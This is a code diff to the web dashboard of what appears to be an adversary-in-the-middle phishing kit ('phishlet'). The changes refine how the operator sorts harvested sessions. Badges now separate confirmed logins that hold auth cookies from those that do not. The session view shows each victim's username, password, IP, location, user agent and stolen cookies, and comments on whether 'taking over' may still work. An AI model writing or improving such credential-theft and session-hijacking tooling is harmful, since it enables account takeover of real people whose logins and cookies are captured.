@@ -171,7 +171,8 @@ async function render() {
 }
 function stageBadge(s) {
   var st = s.stage === undefined ? 0 : s.stage;
-  if (st >= 3) return '<span class="badge ok" title="login completed, cookies are usable">auth</span>';
+  if (st >= 3 && s.usable) return '<span class="badge ok" title="login confirmed and the auth cookies are held">auth</span>';
+  if (st >= 3) return '<span class="badge warn" title="' + esc(s.usable_reason || 'provider confirmed but no auth cookie arrived') + '">auth, no cookie</span>';
   if (st === 2) return '<span class="badge acc" title="credentials entered but the provider never confirmed the login">password only</span>';
   if (st === 1) return '<span class="badge mut" title="only the email was submitted">email only</span>';
   return '<span class="badge mut" style="opacity:.7" title="landed, nothing submitted">visited</span>';
@@ -216,11 +217,12 @@ async function openSession(id) {
   var tok = s.tokens && Object.keys(s.tokens).length ? JSON.stringify(s.tokens, null, 2) : '(none)';
   var body = '<div class="kv">' +
       row('Username', s.username || '-', s.username) + row('Password', s.password || '-', s.password) +
-      row('Status', (s.stage_name || 'visited') + (s.usable ? '' : ' (not confirmed)')) +
-      row('IP', s.remote_addr || '-') + row('Location', geo) +
+      row('Status', (s.stage_name || 'visited') + (s.usable ? '' : ' (not confirmed)')) +      row('IP', s.remote_addr || '-') + row('Location', geo) +
       row('Captured', fmtTime(s.create_time)) + row('Landing URL', s.landing_url || '-') +
     '</div>' +
-    (s.usable ? '' : '<div class="note mt8">The provider never confirmed the login, so these cookies may not sign in. Worth trying only if the victim got as far as the password page.</div>') +
+    (s.usable ? '' : '<div class="note warn mt8"><b>Not usable.</b> ' + esc(s.usable_reason || 'no cookie evidence') +
+      (s.missing_cookies && s.missing_cookies.length ? '<div class="mt8 mono" style="font-size:11px">missing: ' + esc(s.missing_cookies.join(', ')) + '</div>' : '') +
+      '<div class="mt8">Taking over may still work, but the provider never confirmed this login with a cookie.</div></div>') +
     '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '-') + '</div></div>' +
     '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ' + (s.usable ? 'ok' : 'mut') + '">' + s.token_count + ' stored</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
   openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet), body,
